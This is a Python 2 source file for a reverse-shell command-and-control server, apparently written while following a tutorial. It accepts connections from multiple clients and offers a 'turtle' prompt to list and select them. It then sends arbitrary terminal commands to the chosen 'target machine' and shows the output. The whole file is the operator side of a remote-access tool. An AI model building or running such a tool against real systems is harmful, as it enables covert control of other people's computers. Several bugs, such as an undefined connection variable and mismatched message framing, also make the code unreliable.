#!/usr/bin/python
 
import socket
import sys
import json
import struct

import threading
#from queue import Queue

numberOfThreads = 2
jobNumber = [1,2]

#queue = Queue()
allConnections = [] # all connection objects
allAddresses = [] # all addresses

#------------------------------------------------------------------------------

# Setup socket (allows computers to connect)
def socketSetup():
	global host
	global port
	global s
	
	try:		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object
		host = 'localhost' # Use Private IP here: 172.31.38.163, localhost
		port = 9999
		print "socket.gethostbyname(host) is: {}".format(socket.gethostbyname(host)) # Get local machine name
		print "socketSetup: host is: {} and port is: {}".format(host, port)

		s.bind((host, port)) # Bind to the port
		s.listen(5)  # 5 is bad connections it can take before refusing any new connections
		print "Server waiting for connections on port: {}...".format(port)
		
		# Close all connections and remove from lists
		for c in allConnections:
			c.close()
		del allConnections[:]
		del allAddresses[:]
			
		# Accept incoming connections from multiple clients
		# Todo: Need thread here which listens for connections
		while 1:
			try:
				conn, address = s.accept()     # Blocking. Establish connection with a client
				conn.setblocking(1) # No timeout. Unsure from episode 8
				allConnections.append(conn)
				allAddresses.append(address)								

				print '\nGot a connection from: {}'.format(address)
				#sendCommands(conn, s)
				startTurtle()
				conn.close()
			except Exception as e:
				print "socket accept error: {}".format(e)
				exit(0)

	except socket.error as message:
		print "socket error: {}".format(message)

#------------------------------------------------------------------------------
# Starts turtle to list and select client to connect to
def startTurtle():
	print "starting turtle to list and select commands"
	while True:
		print "turtle> ",
		cmd = raw_input()
		cmdWords = cmd.split()

		# Handle case user wants to quit		
		if cmd == 'quit':
			print "Quitting whole program ..."
			conn.close()
			s.close()
			sys.exit()

		# Show current connections
		elif cmd == 'list':
			listConnections()
			
		# Chose a connection
		elif cmdWords[0] == 'select':	#connection selection command
			if len(cmdWords) > 2:
				print "Too many arguments passed in for select command. Try again"
				continue
			print "You have made a selection command."
			# Get conn object from list if valid and exists
			chosenClient = selectClient(cmdWords[1])
			if chosenClient is None:
				print "Invalid clientId: {}. Try again ...".format(cmdWords[1])
				continue
			else:
				print "Will connect to: {} ...".format(cmdWords[1])
				print "chosenClient is: {}".format(chosenClient)
				sendCommands(chosenClient["conn"], s)

		else:
			print "No command entered in turtle."

#------------------------------------------------------------------------------

# Displays all current connections
# Todo: Now just sending in '1' as like a ping. Can make a proper message
def listConnections():
	print "unpinged allConnections is {}".format(allConnections)
	print "unpinged allAddresses is {}".format(allAddresses)
	print "Checking whether current connections still valid or not ..."
	results = ''
	for i, conn in enumerate(allConnections): # Use enumerate to get a counter variable
		# Test valid connection or not before showing
		try:
			testPing = json.dumps('1')
			conn.send(testPing) # Send just to see if get response
			#print "Sent"
			clientTestReply = recv_msg(conn)
			#    print "clientTestReply is: {}".format(clientTestReply)
			# Todo: For some weird reason, first ping to a disconected client
			# returns none instead of catching exception , so deal with it
			# separalte here
			if clientTestReply is None: # Client not connected anymore, so remove from lists
				print "clientReply is None for some reason. So remove."
				del allConnections[i]
				del allAddresses[i]
				continue
		except:	# Client not connected anymore, so remove from lists
			print "conn: {} not connected anymore".format(conn)
			del allConnections[i]
			del allAddresses[i]
			continue
		# Making string of connections
		results = results + str(i) + '  ' + str(allAddresses[i][0]) + '  ' + str(allAddresses[i][1]) + "\n"
	
	print "----- Clients List -----\n{}".format(results)
	return

#------------------------------------------------------------------------------

# Select a client to connect to
# Todo: Handle case where user selects a connection not there anymore
def selectClient(clientId):
	print "You chose clientId: {}".format(clientId)
	try:
		clientId = int(clientId)
		chosenClientConn = allConnections[clientId]
		chosenClientAddr = allAddresses[clientId]
		
		chosenClient = {}
		chosenClient["conn"] = chosenClientConn
		chosenClient["addr"] = chosenClientAddr
		return chosenClient

	except Exception as e:
		print "Exception in selectClient func as: {}".format(e)
		return None

#------------------------------------------------------------------------------

# Send terminal commands to target machine
def sendCommands(conn, s):
	print "\n\nCan now send commands."
	print "conn is: {} and s is: {}".format(conn, s)
	
	# Todo: Get current path from client first
	cmd = 'getCurrentPath'
	cmd = json.dumps(cmd)
	conn.send(cmd)
	currentClientPath = recv_msg(conn)
	print "Current client path is: {}\n".format(currentClientPath)
	
	# Will send commands from this point on.
	print "Enter terminal commands from now on.\n"
	while True:
		print currentClientPath + ">",
		cmd = raw_input()
		cmdWords = cmd.split()

		# Handle case user wants to quit		
		if cmd == 'quit':
			print "Quitting connection ..."
			conn.close()
			s.close()
			sys.exit()

		elif len(cmd) > 0: # Only send if actually data there
			cmd = json.dumps(cmd)
			conn.send(cmd)
			clientReply = recv_msg(conn) # Get reply for command
			#print "clientReply is: {}".format(clientReply)
			clientReply = json.loads(clientReply) # Reply loaded into dict
			#print "clientReply after loads is: {}\n".format(clientReply)
			
			# Check if there was an exception
			if clientReply["exception"] == "":	# No exception
				currentClientPath = clientReply["currentDir"] # Update path
				if clientReply["commandOutput"] != "": # Print output of command also. E.g python --version
					print clientReply["commandOutput"]

			else: # Exception received, so just print it				
				print clientReply["exception"]

		else:
			print "No command entered."

#------------------------------------------------------------------------------

# These helper functions needed to send and receive longer messages.
# From http://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data
def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = ''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

#------------------------------------------------------------------------------

# Example program
if __name__ == "__main__":
	socketSetup()
